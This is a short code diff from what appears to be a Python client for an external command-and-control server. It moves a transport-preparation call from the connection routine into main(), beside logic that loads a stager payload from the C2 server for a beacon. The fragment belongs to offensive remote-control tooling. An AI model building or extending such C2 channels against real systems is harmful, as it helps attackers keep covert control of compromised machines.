@@ -29,9 +29,6 @@ def createConnection(beaconId):
 	# Start with logic to setup the connection to the external_c2 server
 	sock = commonUtils.createSocket()
 
-	# Prep the transport module
-	prep_trans = transport.prepTransport()
-
 	if config.MODE == "stager":
 		# Let's get the stager from the c2 server
 		stager_status = configureStage.loadStager(sock, beaconId)
@@ -100,6 +97,9 @@ def main():
 	importModule(config.TRANSPORT_MODULE, "transport")
 	commonUtils.importModule(config.TRANSPORT_MODULE, "transport")
 	
+	# Prep the transport module
+	transport.prepTransport()
+
 	if config.verbose:
 		print( (commonUtils.color("Payload Stage: ") + "%s") % (config.MODE))
 
